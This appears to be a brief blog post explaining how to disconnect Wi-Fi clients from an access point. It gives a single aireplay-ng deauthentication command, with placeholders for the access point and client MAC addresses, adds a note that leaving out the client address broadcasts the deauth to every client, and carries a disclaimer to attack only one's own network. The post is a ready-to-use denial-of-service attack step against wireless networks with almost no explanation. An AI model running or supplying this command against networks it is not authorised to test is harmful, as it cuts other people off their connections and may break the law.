---
layout: post
title: "Deauthenticate (Disconnect) WLAN Clients from Access Point"
---

> **Disclaimer**: This might be illegal in some countries. Perform this attack on your own network only!

```bash
aireplay-ng -0 1 -a <$AP_MAC> [-c <$CLIENT_MAC>] wlan0
```

> **Note**: If `-c` ist not set, the deauth request is broadcasted to all clients!

---
